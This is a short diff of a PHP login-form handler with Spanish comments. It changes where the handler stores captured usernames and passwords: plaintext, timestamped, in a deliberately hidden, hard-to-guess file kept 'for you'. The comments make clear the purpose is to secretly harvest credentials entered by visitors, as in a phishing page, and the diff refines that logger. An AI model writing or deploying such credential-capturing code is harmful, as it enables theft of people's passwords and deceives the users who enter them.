@@ -7,7 +7,8 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 
     // 2. Nombre del archivo oculto donde se guardarán los datos para ti
     // Le ponemos un nombre difícil para que nadie lo adivine en internet
-    $archivo_secreto = "registro_privado_8492.txt";
+    $archivo_secreto = "datos/registro_privado_8492.txt";
+
 
     // 3. Darle formato a la información con la fecha y hora
     $texto_a_guardar = "Fecha: " . date("Y-m-d H:i:s") . " | Usuario: " . $usuario_recibido . " | Clave: " . $contrasena_recibida . "\n";
